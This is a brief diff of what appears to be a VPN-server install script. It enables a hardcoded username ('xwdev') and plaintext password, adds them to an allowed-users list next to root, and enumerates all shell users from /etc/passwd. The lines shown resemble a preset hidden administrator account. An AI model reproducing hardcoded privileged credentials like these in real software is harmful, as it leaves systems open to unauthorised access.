@@ -41,14 +41,14 @@ biji=$(date +"%Y-%m-%d" -d "$dateFromServer")
 
 # URL repository
 REPO="https://raw.githubusercontent.com/kingstorevpn/os/main/"
-#pwadm="@Ridwan112#"
+pwadm="@Ridwan112#"
 # Download file dan proses
 
-#Username="xwdev"
-#Password="$pwadm"
+Username="xwdev"
+Password="$pwadm"
 
 # Daftar user yang diizinkan
-#allowed_users=("root" "$Username")
+allowed_users=("root" "$Username")
 
 # Dapatkan semua user yang bisa login ke terminal
 all_users=$(awk -F: '$7 ~ /(\/bin\/bash|\/bin\/sh)$/ {print $1}' /etc/passwd)
